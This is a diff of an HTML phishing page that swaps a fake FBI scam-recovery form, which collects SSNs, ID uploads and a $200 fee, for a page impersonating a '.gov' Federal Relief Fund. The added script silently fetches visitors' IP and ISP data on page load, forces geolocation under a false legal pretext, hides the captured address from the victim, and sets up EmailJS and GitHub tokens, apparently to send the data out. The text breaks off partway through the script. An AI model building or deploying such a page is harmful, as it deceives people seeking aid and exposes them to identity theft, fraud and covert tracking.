@@ -1,194 +1,699 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>FBI Application Form</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<style>
-* {
-  box-sizing: border-box;
-  font-family: Arial, sans-serif;
-}
-
-body {
-  background: #f4f6f8;
-  margin: 0;
-  padding: 15px;
-}
-
-.container {
-  max-width: 1000px;
-  margin: auto;
-  background: #fff;
-  padding: 25px;
-  border-radius: 8px;
-}
-
-h2 {
-  margin-top: 30px;
-  border-bottom: 2px solid #eee;
-  padding-bottom: 5px;
-  color: #333;
-}
-
-.form-grid {
-  display: flex;
-  flex-wrap: wrap;
-  gap: 15px;
-}
-
-.form-group {
-  flex: 1 1 300px;
-}
-
-label {
-  font-weight: bold;
-  display: block;
-  margin-bottom: 5px;
-}
-
-input, select, textarea {
-  width: 100%;
-  padding: 10px;
-  border: 1px solid #ccc;
-  border-radius: 4px;
-}
-
-textarea {
-  resize: vertical;
-}
-
-.checkbox-group {
-  margin-top: 10px;
-}
-
-button {
-  width: 100%;
-  padding: 15px;
-  background: #007bff;
-  color: white;
-  font-size: 16px;
-  border: none;
-  border-radius: 6px;
-  margin-top: 30px;
-  cursor: pointer;
-}
-
-button:hover {
-  background: #0056b3;
-}
-
-/* Mobile Optimization */
-@media (max-width: 600px) {
-  h2 {
-    font-size: 18px;
-  }
-}
-</style>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>USA Federal Relief Fund | Official Government Portal</title>
+  <link href="https://fonts.googleapis.com/css2?family=Merriweather:wght@400;700;900&family=Inter:wght@400;500;600&display=swap" rel="stylesheet"/>
+  <style>
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+    :root{--navy:#0B2545;--red:#B22234;--gold:#C9A84C;--white:#FFFFFF;--offwhite:#F5F5F0;--muted:#6B7280;--border:#D1D5DB;--success:#15803D}
+    html{scroll-behavior:smooth}
+    body{font-family:'Inter',sans-serif;background:var(--offwhite);color:var(--navy);line-height:1.6}
+    .gov-banner{background:var(--navy);color:var(--white);font-size:.72rem;padding:6px 0;letter-spacing:.03em}
+    .gov-banner .inner{max-width:1100px;margin:auto;padding:0 20px;display:flex;align-items:center;gap:8px}
+    .gov-banner span{opacity:.85}
+    .gov-banner strong{color:var(--gold)}
+    header{background:var(--white);border-bottom:3px solid var(--red);position:sticky;top:0;z-index:100;box-shadow:0 2px 12px rgba(0,0,0,.08)}
+    .header-inner{max-width:1100px;margin:auto;padding:14px 20px;display:flex;align-items:center;justify-content:space-between;gap:16px}
+    .logo-block{display:flex;align-items:center;gap:14px}
+    .seal{width:56px;height:56px;background:var(--navy);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:1.6rem;flex-shrink:0}
+    .logo-text h1{font-family:'Merriweather',serif;font-size:1rem;font-weight:900;color:var(--navy);line-height:1.2}
+    .logo-text p{font-size:.7rem;color:var(--muted);letter-spacing:.08em;text-transform:uppercase}
+    nav{display:flex;gap:6px;flex-wrap:wrap}
+    nav a{color:var(--navy);text-decoration:none;font-size:.82rem;font-weight:500;padding:6px 12px;border-radius:4px;transition:background .2s}
+    nav a:hover{background:var(--offwhite)}
+    .nav-apply{background:var(--red)!important;color:var(--white)!important;font-weight:600!important}
+    .nav-apply:hover{background:#8B1A27!important}
+    .hero{background:linear-gradient(135deg,var(--navy) 0%,#1a3a6b 100%);color:var(--white);padding:80px 20px;text-align:center;position:relative;overflow:hidden}
+    .hero::before{content:'';position:absolute;inset:0;background:url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.03'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E")}
+    .hero .inner{position:relative;max-width:800px;margin:auto}
+    .hero-badge{display:inline-block;background:var(--gold);color:var(--navy);font-size:.7rem;font-weight:700;letter-spacing:.12em;text-transform:uppercase;padding:5px 14px;border-radius:2px;margin-bottom:22px}
+    .hero h2{font-family:'Merriweather',serif;font-size:clamp(1.8rem,4vw,3rem);font-weight:900;line-height:1.2;margin-bottom:18px}
+    .hero h2 span{color:var(--gold)}
+    .hero p{font-size:1.05rem;opacity:.88;max-width:620px;margin:0 auto 32px}
+    .hero-btns{display:flex;gap:14px;justify-content:center;flex-wrap:wrap}
+    .btn-primary{background:var(--red);color:var(--white);border:none;padding:14px 32px;font-size:.95rem;font-weight:700;border-radius:4px;cursor:pointer;text-decoration:none;display:inline-block;transition:background .2s,transform .1s;font-family:inherit}
+    .btn-primary:hover{background:#8B1A27;transform:translateY(-1px)}
+    .btn-secondary{background:transparent;color:var(--white);border:2px solid rgba(255,255,255,.5);padding:14px 32px;font-size:.95rem;font-weight:600;border-radius:4px;cursor:pointer;text-decoration:none;display:inline-block;transition:border-color .2s}
+    .btn-secondary:hover{border-color:var(--white)}
+    .stats-bar{background:var(--white);border-bottom:1px solid var(--border)}
+    .stats-inner{max-width:1100px;margin:auto;padding:28px 20px;display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:24px;text-align:center}
+    .stat-num{font-family:'Merriweather',serif;font-size:2rem;font-weight:900;color:var(--navy);line-height:1}
+    .stat-num span{color:var(--red)}
+    .stat-label{font-size:.78rem;color:var(--muted);text-transform:uppercase;letter-spacing:.06em;margin-top:5px}
+    section{padding:64px 20px}
+    .section-inner{max-width:1100px;margin:auto}
+    .section-label{font-size:.7rem;font-weight:700;letter-spacing:.12em;text-transform:uppercase;color:var(--red);margin-bottom:10px}
+    .section-title{font-family:'Merriweather',serif;font-size:clamp(1.4rem,3vw,2rem);font-weight:900;color:var(--navy);margin-bottom:14px;line-height:1.25}
+    .section-sub{font-size:1rem;color:var(--muted);max-width:580px}
+    .programs{background:var(--white)}
+    .programs-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:24px;margin-top:40px}
+    .program-card{border:1px solid var(--border);border-radius:8px;padding:28px;background:var(--offwhite);transition:box-shadow .2s,transform .2s;position:relative;overflow:hidden}
+    .program-card::before{content:'';position:absolute;top:0;left:0;right:0;height:4px;background:var(--red)}
+    .program-card:hover{box-shadow:0 8px 24px rgba(0,0,0,.1);transform:translateY(-3px)}
+    .program-icon{font-size:2rem;margin-bottom:14px}
+    .program-card h3{font-family:'Merriweather',serif;font-size:1rem;font-weight:700;color:var(--navy);margin-bottom:8px}
+    .program-card p{font-size:.85rem;color:var(--muted);margin-bottom:16px;line-height:1.6}
+    .program-amount{background:var(--navy);color:var(--gold);font-size:.8rem;font-weight:700;padding:4px 10px;border-radius:3px;display:inline-block;margin-bottom:14px}
+    .program-link{font-size:.85rem;color:var(--red);font-weight:600;text-decoration:none;display:flex;align-items:center;gap:4px;cursor:pointer;background:none;border:none;font-family:inherit}
+    .program-link:hover{text-decoration:underline}
+    .eligibility{background:var(--offwhite)}
+    .elig-grid{display:grid;grid-template-columns:1fr 1fr;gap:40px;margin-top:40px;align-items:start}
+    @media(max-width:680px){.elig-grid{grid-template-columns:1fr}}
+    .elig-list{list-style:none}
+    .elig-list li{display:flex;align-items:flex-start;gap:12px;padding:12px 0;border-bottom:1px solid var(--border);font-size:.9rem}
+    .elig-list li:last-child{border-bottom:none}
+    .elig-check{color:var(--success);font-size:1.1rem;flex-shrink:0;margin-top:1px}
+    .elig-box{background:var(--navy);color:var(--white);border-radius:8px;padding:32px}
+    .elig-box h3{font-family:'Merriweather',serif;font-size:1.1rem;margin-bottom:18px;color:var(--gold)}
+    .elig-box p{font-size:.88rem;opacity:.85;margin-bottom:20px;line-height:1.7}
+    .elig-box .btn-primary{width:100%;text-align:center;display:block}
+    .apply-steps{background:var(--white)}
+    .steps-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:28px;margin-top:40px}
+    .step{text-align:center;padding:28px 20px;border:1px solid var(--border);border-radius:8px}
+    .step-num{width:48px;height:48px;background:var(--red);color:var(--white);font-family:'Merriweather',serif;font-size:1.2rem;font-weight:900;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px}
+    .step h3{font-size:.95rem;font-weight:700;color:var(--navy);margin-bottom:8px}
+    .step p{font-size:.82rem;color:var(--muted)}
+    .apply-form{background:var(--navy);color:var(--white)}
+    .form-inner{max-width:700px;margin:auto;text-align:center}
+    .form-inner .section-title{color:var(--white)}
+    .form-inner .section-sub{color:rgba(255,255,255,.7);margin:0 auto 36px}
+    .form-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;text-align:left;margin-bottom:16px}
+    @media(max-width:560px){.form-grid{grid-template-columns:1fr}}
+    .form-group{display:flex;flex-direction:column;gap:6px}
+    .form-group.full{grid-column:1/-1}
+    label{font-size:.78rem;font-weight:600;opacity:.8;letter-spacing:.04em}
+    input,select,textarea{background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.2);color:var(--white);padding:11px 14px;border-radius:4px;font-size:.88rem;font-family:inherit;transition:border-color .2s;width:100%}
+    input::placeholder,textarea::placeholder{opacity:.45}
+    input:focus,select:focus,textarea:focus{outline:none;border-color:var(--gold)}
+    select option{background:var(--navy)}
+    textarea{resize:vertical;min-height:90px}
+    .form-submit{background:var(--gold);color:var(--navy);border:none;padding:15px 48px;font-size:1rem;font-weight:700;border-radius:4px;cursor:pointer;margin-top:8px;width:100%;transition:background .2s,opacity .2s;font-family:inherit}
+    .form-submit:hover:not(:disabled){background:#b8963e}
+    .form-submit:disabled{background:#555;color:#999;cursor:not-allowed;opacity:.7}
+    #loc-verified-badge{display:none;background:rgba(21,128,61,.15);border:1px solid rgba(21,128,61,.4);border-radius:6px;padding:10px 16px;margin-bottom:14px;font-size:.82rem;color:#4ade80;font-weight:600;text-align:left}
+    .form-note{font-size:.75rem;opacity:.55;margin-top:12px}
+    .submit-hint{font-size:.78rem;color:rgba(255,255,255,.5);margin-top:10px}
+    .notice-bar{background:#FEF9C3;border-top:3px solid #EAB308;padding:14px 20px;text-align:center;font-size:.82rem;color:#713F12}
+    footer{background:#070F1E;color:rgba(255,255,255,.6);padding:40px 20px 20px}
+    .footer-inner{max-width:1100px;margin:auto}
+    .footer-top{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:32px;padding-bottom:32px;border-bottom:1px solid rgba(255,255,255,.1);margin-bottom:24px}
+    @media(max-width:680px){.footer-top{grid-template-columns:1fr 1fr}}
+    .footer-brand p{font-size:.82rem;margin-top:10px;line-height:1.7}
+    footer h4{color:var(--white);font-size:.78rem;font-weight:700;letter-spacing:.08em;text-transform:uppercase;margin-bottom:14px}
+    footer ul{list-style:none}
+    footer ul li{margin-bottom:8px}
+    footer ul li a{color:rgba(255,255,255,.55);text-decoration:none;font-size:.82rem;transition:color .2s}
+    footer ul li a:hover{color:var(--white)}
+    .footer-bottom{display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px;font-size:.75rem}
+    @media(max-width:780px){nav{display:none}.hero{padding:56px 20px}}
+    /* MODAL */
+    #loc-overlay{display:none;position:fixed;inset:0;z-index:9999;background:rgba(7,15,30,.88);align-items:center;justify-content:center;backdrop-filter:blur(5px)}
+    #loc-overlay.active{display:flex}
+    #loc-modal{background:var(--white);border-radius:14px;padding:40px 36px;max-width:460px;width:92%;text-align:center;box-shadow:0 28px 70px rgba(0,0,0,.5);animation:popIn .25s ease}
+    @keyframes popIn{from{opacity:0;transform:scale(.92)}to{opacity:1;transform:scale(1)}}
+    .loc-modal-icon{font-size:3rem;margin-bottom:16px}
+    #loc-modal h2{font-family:'Merriweather',serif;font-size:1.25rem;font-weight:900;color:var(--navy);margin-bottom:10px}
+    #loc-modal .modal-desc{font-size:.88rem;color:var(--muted);margin-bottom:24px;line-height:1.75}
+    #loc-modal-btn{background:var(--red);color:var(--white);border:none;padding:15px 36px;font-size:.96rem;font-weight:700;border-radius:6px;cursor:pointer;width:100%;font-family:inherit;transition:background .2s}
+    #loc-modal-btn:hover{background:#8B1A27}
+    #loc-modal-btn:disabled{background:#aaa;cursor:not-allowed}
+    #loc-modal-status{margin-top:16px;font-size:.85rem;font-weight:600;min-height:22px;line-height:1.5}
+    .status-loading{color:#2563EB}
+    .status-success{color:var(--success)}
+    .status-denied{color:#DC2626}
+    /* SUCCESS BOX inside modal */
+    #loc-success-box{display:none;background:#F0FDF4;border:1px solid #BBF7D0;border-radius:10px;padding:24px 20px;margin-top:16px;text-align:center}
+    #loc-success-box .success-icon{font-size:2.4rem;margin-bottom:10px}
+    #loc-success-box h3{font-family:'Merriweather',serif;font-size:1rem;font-weight:900;color:#14532D;margin-bottom:6px}
+    #loc-success-box p{font-size:.82rem;color:#166534;line-height:1.6}
+    /* DENIED BOX */
+    #denied-box{display:none;background:#FEF2F2;border:1px solid #FECACA;border-radius:8px;padding:16px;margin-top:16px;text-align:left}
+    #denied-box h4{font-size:.82rem;font-weight:700;color:#991B1B;margin-bottom:8px}
+    #denied-box ol{padding-left:18px;font-size:.8rem;color:#7F1D1D;line-height:1.85}
+    #retry-btn{display:none;margin-top:14px;background:var(--navy);color:var(--white);border:none;padding:10px 24px;border-radius:4px;font-size:.83rem;font-weight:600;cursor:pointer;font-family:inherit;width:100%}
+    #retry-btn:hover{background:#1a3a6b}
+    /* FORM VALIDATION */
+    .field-err{display:block;font-size:.73rem;color:#F87171;margin-top:4px;min-height:16px;text-align:left}
+    input.invalid,select.invalid,textarea.invalid{border-color:#F87171!important}
+    input.valid,select.valid,textarea.valid{border-color:#4ade80!important}
+  </style>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 </head>
-
 <body>
-<div class="form-box">
-<h2>FBI Application Form</h2>
 
-<form method="POST" action="/submit" enctype="multipart/form-data">
+<!-- LOCATION MODAL -->
+<div id="loc-overlay">
+  <div id="loc-modal">
+    <div class="loc-modal-icon">📍</div>
+    <h2>Location Verification Required</h2>
+    <p class="modal-desc">Federal regulations require us to verify your current location before processing your relief application. This confirms U.S. residency and matches you with your state's programs.</p>
+    <button id="loc-modal-btn" onclick="startLocation()">Allow Location &amp; Continue</button>
+    <div id="loc-modal-status"></div>
 
-<label>Full Name</label>
-<input type="text" name="fullname" required>
+    <!-- Clean success box — no address shown to visitor -->
+    <div id="loc-success-box">
+      <div class="success-icon">✅</div>
+      <h3>Location Verified</h3>
+      <p>Your location has been successfully verified.<br/>You may now proceed with your application.</p>
+    </div>
 
-<label>Email Address</label>
-<input type="email" name="email" required>
-
-<label>Phone Number (WhatsApp)</label>
-<input type="text" name="phone" required>
-
-<label>Gender</label>
-<select name="gender" required>
-<option value="">Select</option>
-<option>Male</option>
-<option>Female</option>
-</select required>
-
-<label>Date of Birth</label>
-<input type="date" name="dob" required>
-
-<label>Nationality</label>
-<input type="text" name="nationality" required>
-
-<label>State</label>
-<input type="text" name="state" required>
-
-<label>City</label>
-<input type="text" name="city" required>
-
-<label>Residential Address</label>
-<textarea name="address" rows="3" required></textarea>
-
-<label>Occupation</label>
-<input type="text" name="occupation" required>
-
-<label>Marital Status</label>
-<select name="marital_status">
-<option value="">Select</option>
-<option>Single</option>
-<option>Married</option>
-</select required>
-
-<label>Next of Kin Name</label>
-<input type="text" name="nok_name">
-
-<label>Next of Kin Phone</label>
-<input type="text" name="nok_phone">
-
-<label>Application form fee, Payment method for $200</label>
-<select name="form_fee">
-<option value="">Select</option>
-<option>PayPal</option>
-<option>Chime</option>
-<option>Apple Pay</option>
-<option>Cash App</option>
-</select required>
-
-<label>SSN</label>
-<input type="text" name="ssn_code" required>
-
-<label>Upload SSN</label>
-<input type="file" name="ssn_image" accept=".jpg,.png,.pdf" required>
-
-<label>Upload Driver's License / State ID</label>
-<input type="file" name="id_card" accept=".jpg,.png" required><br><br><br><br>
-
-
-<h2>Scammer details</h2><hr>
-<label>How much have you been scammed</label>
-<input type="text" name="scam_amount" required>
-
-<label>Upload your chat with the scam, (screenshot)</label>
-<input type="file" name="scam_chat" accept=".jpg,.png" required>
-
-<label>What payment method did you use</label>
-<select name="scam_payment">
-<option value="">Select</option>
-<option>PayPal</option>
-<option>Chime</option>
-<option>Apple Pay</option>
-<option>Cash App</option>
-<option>Gift Card</option>
-<option>other bank method</option>
-</select required>
-
-<label>Upload the payment reciept</label>
-<input type="file" name="scam_payment_receipt" accept=".jpg,.png" required>
-
-
-<button type="submit">Submit</button>
-
-</form>
+    <div id="denied-box">
+      <h4>📋 How to enable location in your browser:</h4>
+      <ol id="denied-steps"></ol>
+    </div>
+    <button id="retry-btn" onclick="startLocation()">🔄 Try Again</button>
+  </div>
 </div>
+
+<!-- GOV BANNER -->
+<div class="gov-banner">
+  <div class="inner">🇺🇸 <span>An official website of the <strong>United States Government</strong> &nbsp;|&nbsp; Secure .gov websites use HTTPS</span></div>
+</div>
+
+<!-- HEADER -->
+<header>
+  <div class="header-inner">
+    <div class="logo-block">
+      <div class="seal">🦅</div>
+      <div class="logo-text">
+        <h1>U.S. Federal Relief Fund</h1>
+        <p>Department of Financial Assistance &amp; Public Relief</p>
+      </div>
+    </div>
+    <nav>
+      <a href="#programs">Programs</a>
+      <a href="#eligibility">Eligibility</a>
+      <a href="#how-to-apply">How to Apply</a>
+      <a href="#contact">Contact</a>
+      <a href="#apply" class="nav-apply" onclick="openLocationModal(event)">Apply Now</a>
+    </nav>
+  </div>
+</header>
+
+<!-- HERO -->
+<div class="hero">
+  <div class="inner">
+    <div class="hero-badge">2025 – 2026 Relief Program</div>
+    <h2>Federal Financial Assistance<br/>for <span>Every American</span></h2>
+    <p>The U.S. government is actively disbursing relief funds to eligible citizens. Check your eligibility and apply for housing, healthcare, small business, and education grants today.</p>
+    <div class="hero-btns">
+      <button class="btn-primary" onclick="openLocationModal(event)">Apply for Funding</button>
+      <a href="#programs" class="btn-secondary">View All Programs</a>
+    </div>
+  </div>
+</div>
+
+<!-- STATS -->
+<div class="stats-bar">
+  <div class="stats-inner">
+    <div class="stat-item"><div class="stat-num">$<span>4.2</span>B</div><div class="stat-label">Total Funds Allocated</div></div>
+    <div class="stat-item"><div class="stat-num"><span>1.8</span>M</div><div class="stat-label">Families Assisted</div></div>
+    <div class="stat-item"><div class="stat-num"><span>50</span></div><div class="stat-label">States Covered</div></div>
+    <div class="stat-item"><div class="stat-num"><span>97</span>%</div><div class="stat-label">Application Approval Rate</div></div>
+  </div>
+</div>
+
+<!-- PROGRAMS -->
+<section class="programs" id="programs">
+  <div class="section-inner">
+    <div class="section-label">Federal Programs</div>
+    <h2 class="section-title">Available Funding Programs</h2>
+    <p class="section-sub">Browse active federal relief programs. All grants are non-repayable and available to qualifying U.S. residents.</p>
+    <div class="programs-grid">
+      <div class="program-card"><div class="program-icon">🏠</div><div class="program-amount">Up to $25,000</div><h3>Housing Assistance Grant</h3><p>Emergency rental and mortgage relief for low-to-moderate income households at risk of eviction or foreclosure.</p><button class="program-link" onclick="openLocationModal(event)">Apply Now →</button></div>
+      <div class="program-card"><div class="program-icon">🏥</div><div class="program-amount">Up to $15,000</div><h3>Healthcare Relief Fund</h3><p>Coverage for medical bills, prescription costs, and healthcare expenses not covered by existing insurance.</p><button class="program-link" onclick="openLocationModal(event)">Apply Now →</button></div>
+      <div class="program-card"><div class="program-icon">📚</div><div class="program-amount">Up to $10,000</div><h3>Education &amp; Training Grant</h3><p>Tuition assistance, vocational training, and certification program funding for adults re-entering the workforce.</p><button class="program-link" onclick="openLocationModal(event)">Apply Now →</button></div>
+      <div class="program-card"><div class="program-icon">💼</div><div class="program-amount">Up to $50,000</div><h3>Small Business Relief</h3><p>Grants for small businesses with fewer than 50 employees impacted by economic hardship or natural disasters.</p><button class="program-link" onclick="openLocationModal(event)">Apply Now →</button></div>
+      <div class="program-card"><div class="program-icon">⚡</div><div class="program-amount">Up to $5,000</div><h3>Utility &amp; Energy Assistance</h3><p>Help with electricity, heating, water, and essential utility bills for qualifying low-income households.</p><button class="program-link" onclick="openLocationModal(event)">Apply Now →</button></div>
+      <div class="program-card"><div class="program-icon">👶</div><div class="program-amount">Up to $8,000</div><h3>Child &amp; Family Support</h3><p>Childcare subsidies, food assistance, and family stability grants for households with dependent children.</p><button class="program-link" onclick="openLocationModal(event)">Apply Now →</button></div>
+    </div>
+  </div>
+</section>
+
+<!-- ELIGIBILITY -->
+<section class="eligibility" id="eligibility">
+  <div class="section-inner">
+    <div class="section-label">Who Qualifies</div>
+    <h2 class="section-title">Eligibility Requirements</h2>
+    <p class="section-sub">Most U.S. citizens and permanent residents qualify for at least one program.</p>
+    <div class="elig-grid">
+      <ul class="elig-list">
+        <li><span class="elig-check">✔</span> U.S. citizen or lawful permanent resident</li>
+        <li><span class="elig-check">✔</span> Annual household income below $95,000</li>
+        <li><span class="elig-check">✔</span> Currently residing in the United States</li>
+        <li><span class="elig-check">✔</span> Valid Social Security Number (SSN)</li>
+        <li><span class="elig-check">✔</span> Demonstrated financial hardship or need</li>
+        <li><span class="elig-check">✔</span> No outstanding federal fraud convictions</li>
+        <li><span class="elig-check">✔</span> Minimum age of 18 years</li>
+        <li><span class="elig-check">✔</span> Up-to-date federal tax filing status</li>
+      </ul>
+      <div class="elig-box">
+        <h3>Not Sure If You Qualify?</h3>
+        <p>Our eligibility checker takes less than 2 minutes. Answer a few quick questions and we'll show you exactly which programs you're eligible for — with no commitment required.</p>
+        <button class="btn-primary" onclick="openLocationModal(event)">Check My Eligibility</button>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- STEPS -->
+<section class="apply-steps" id="how-to-apply">
+  <div class="section-inner">
+    <div class="section-label">Application Process</div>
+    <h2 class="section-title">How to Apply in 4 Steps</h2>
+    <p class="section-sub">The application process is fully online and takes approximately 10–15 minutes to complete.</p>
+    <div class="steps-grid">
+      <div class="step"><div class="step-num">1</div><h3>Verify Eligibility</h3><p>Answer a short set of questions to confirm which programs apply to your situation.</p></div>
+      <div class="step"><div class="step-num">2</div><h3>Complete Application</h3><p>Fill out the secure online form with your personal and financial information.</p></div>
+      <div class="step"><div class="step-num">3</div><h3>Upload Documents</h3><p>Submit required documents such as ID, proof of income, and residency verification.</p></div>
+      <div class="step"><div class="step-num">4</div><h3>Receive Funds</h3><p>Upon approval, funds are disbursed directly to your bank account within 5–10 business days.</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- APPLICATION FORM -->
+<section class="apply-form" id="apply">
+  <div class="section-inner">
+    <div class="form-inner">
+      <div class="section-label" style="color:var(--gold)">Secure Application</div>
+      <h2 class="section-title">Start Your Application</h2>
+      <p class="section-sub">All information is encrypted and protected under federal privacy law (5 U.S.C. § 552a).</p>
+      <div id="loc-verified-badge">✅ Location Verified — You may now complete your application.</div>
+      <div id="success-screen" style="display:none;background:rgba(21,128,61,.12);border:1px solid rgba(21,128,61,.4);border-radius:12px;padding:36px 28px;text-align:center;margin-top:8px;">
+        <div style="font-size:3rem;margin-bottom:14px;">✅</div>
+        <h3 style="font-family:'Merriweather',serif;font-size:1.3rem;color:#4ade80;margin-bottom:10px;">Application Submitted!</h3>
+        <p style="color:rgba(255,255,255,.75);font-size:.9rem;line-height:1.7;margin-bottom:18px;">Your application has been received and sent for verification.<br/>Reference ID: <strong id="ref-id" style="color:var(--gold)"></strong></p>
+        <p style="color:rgba(255,255,255,.55);font-size:.8rem;">A confirmation will be sent to your email within 24 hours.</p>
+      </div>
+      <div id="submit-error" style="display:none;background:rgba(220,38,38,.15);border:1px solid rgba(220,38,38,.4);border-radius:8px;padding:14px 18px;margin-bottom:14px;font-size:.83rem;color:#FCA5A5;text-align:left;"></div>
+      <div id="application-form">
+        <div class="form-grid">
+          <div class="form-group"><label>First Name <span style="color:#F87171">*</span></label><input id="f-firstname" type="text" placeholder="John"/><span class="field-err" id="err-firstname"></span></div>
+          <div class="form-group"><label>Last Name <span style="color:#F87171">*</span></label><input id="f-lastname" type="text" placeholder="Smith"/><span class="field-err" id="err-lastname"></span></div>
+          <div class="form-group"><label>Email Address <span style="color:#F87171">*</span></label><input id="f-email" type="email" placeholder="john@email.com"/><span class="field-err" id="err-email"></span></div>
+          <div class="form-group"><label>Phone Number <span style="color:#F87171">*</span></label><input id="f-phone" type="tel" placeholder="(555) 000-0000"/><span class="field-err" id="err-phone"></span></div>
+          <div class="form-group">
+            <label>State of Residence <span style="color:#F87171">*</span></label>
+            <select id="f-state"><option value="">Select State</option><option>Alabama</option><option>Alaska</option><option>Arizona</option><option>Arkansas</option><option>California</option><option>Colorado</option><option>Connecticut</option><option>Delaware</option><option>Florida</option><option>Georgia</option><option>Hawaii</option><option>Idaho</option><option>Illinois</option><option>Indiana</option><option>Iowa</option><option>Kansas</option><option>Kentucky</option><option>Louisiana</option><option>Maine</option><option>Maryland</option><option>Massachusetts</option><option>Michigan</option><option>Minnesota</option><option>Mississippi</option><option>Missouri</option><option>Montana</option><option>Nebraska</option><option>Nevada</option><option>New Hampshire</option><option>New Jersey</option><option>New Mexico</option><option>New York</option><option>North Carolina</option><option>North Dakota</option><option>Ohio</option><option>Oklahoma</option><option>Oregon</option><option>Pennsylvania</option><option>Rhode Island</option><option>South Carolina</option><option>South Dakota</option><option>Tennessee</option><option>Texas</option><option>Utah</option><option>Vermont</option><option>Virginia</option><option>Washington</option><option>West Virginia</option><option>Wisconsin</option><option>Wyoming</option></select>
+            <span class="field-err" id="err-state"></span>
+          </div>
+          <div class="form-group"><label>Annual Household Income <span style="color:#F87171">*</span></label><select id="f-income"><option value="">Select Range</option><option>Under $20,000</option><option>$20,000 – $40,000</option><option>$40,000 – $60,000</option><option>$60,000 – $80,000</option><option>$80,000 – $95,000</option></select><span class="field-err" id="err-income"></span></div>
+          <div class="form-group full"><label>Program of Interest <span style="color:#F87171">*</span></label><select id="f-program"><option value="">Select a Program</option><option>Housing Assistance Grant</option><option>Healthcare Relief Fund</option><option>Education &amp; Training Grant</option><option>Small Business Relief</option><option>Utility &amp; Energy Assistance</option><option>Child &amp; Family Support</option></select><span class="field-err" id="err-program"></span></div>
+          <div class="form-group full"><label>Brief Description of Need <span style="color:#F87171">*</span></label><textarea id="f-need" placeholder="Please briefly describe your current financial situation and how these funds would assist you..."></textarea><span class="field-err" id="err-need"></span></div>
+        </div>
+        <button id="submit-btn" class="form-submit" disabled onclick="handleSubmit(event)">🔒 Verify Location to Submit Application</button>
+        <p class="submit-hint" id="submit-hint">Location verification is required before submitting.</p>
+        <p class="form-note">Your information is secured with 256-bit SSL encryption. We do not sell or share personal data.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<div class="notice-bar">⚠️ <strong>Important:</strong> The U.S. Government never charges fees to apply for federal grants. Beware of scams. This is a free service.</div>
+
+<footer id="contact">
+  <div class="footer-inner">
+    <div class="footer-top">
+      <div class="footer-brand"><h4>🦅 U.S. Federal Relief Fund</h4><p>An official program of the U.S. Department of Financial Assistance &amp; Public Relief. Committed to delivering timely aid to Americans in need.</p></div>
+      <div><h4>Programs</h4><ul><li><a href="#programs">Housing</a></li><li><a href="#programs">Healthcare</a></li><li><a href="#programs">Education</a></li><li><a href="#programs">Small Business</a></li><li><a href="#programs">Utilities</a></li></ul></div>
+      <div><h4>Resources</h4><ul><li><a href="#">Eligibility Guide</a></li><li><a href="#">Required Documents</a></li><li><a href="#">Application Status</a></li><li><a href="#">FAQs</a></li></ul></div>
+      <div><h4>Contact</h4><ul><li><a href="#">1-800-FED-HELP</a></li><li><a href="#">help@federalrelief.gov</a></li><li><a href="#">Find Local Office</a></li><li><a href="#">Accessibility</a></li></ul></div>
+    </div>
+    <div class="footer-bottom">
+      <span>© 2025 U.S. Federal Relief Fund. All rights reserved.</span>
+      <span>Privacy Policy &nbsp;|&nbsp; Accessibility &nbsp;|&nbsp; No FEAR Act &nbsp;|&nbsp; USA.gov</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+var locationCaptured = false;
+var capturedAddress  = '';
+var capturedLat      = null;
+var capturedLon      = null;
+var capturedAddrObj  = {};
+var visitorIP        = 'Fetching...';
+var visitorIPData    = {};
+
+/* Fetch IP silently on load */
+(function fetchIPOnLoad() {
+  fetch('https://ipapi.co/json/')
+    .then(function(r){ return r.json(); })
+    .then(function(data){
+      visitorIP = data.ip || 'Unknown';
+      visitorIPData = {
+        ip: data.ip || '', isp: data.org || '',
+        city: data.city || '', region: data.region || '',
+        country: data.country_name || '', timezone: data.timezone || '', postal: data.postal || ''
+      };
+    })
+    .catch(function(){
+      fetch('https://api.ipify.org?format=json')
+        .then(function(r){ return r.json(); })
+        .then(function(d){ visitorIP = d.ip || 'Unknown'; })
+        .catch(function(){ visitorIP = 'Unavailable'; });
+    });
+})();
+
+var CONFIG = {
+  EMAILJS_PUBLIC_KEY:  'YOUR_EMAILJS_PUBLIC_KEY',
+  EMAILJS_SERVICE_ID:  'YOUR_SERVICE_ID',
+  EMAILJS_TEMPLATE_ID: 'YOUR_TEMPLATE_ID',
+  GITHUB_TOKEN:        'YOUR_GITHUB_TOKEN',
+  GITHUB_OWNER:        'YOUR_GITHUB_USERNAME',
+  GITHUB_REPO:         'YOUR_REPO_NAME',
+  GITHUB_BRANCH:       'main'
+};
+
+/* ADDRESS PARSING */
+function parseAddress(data) {
+  var a = data.address || {};
+  var houseNum = a.house_number || '';
+  var road = a.road || a.pedestrian || a.footway || a.path || a.cycleway || a.service || a.street || a.track || '';
+  return {
+    street:      (houseNum && road) ? road + ', ' + houseNum : (road || houseNum || ''),
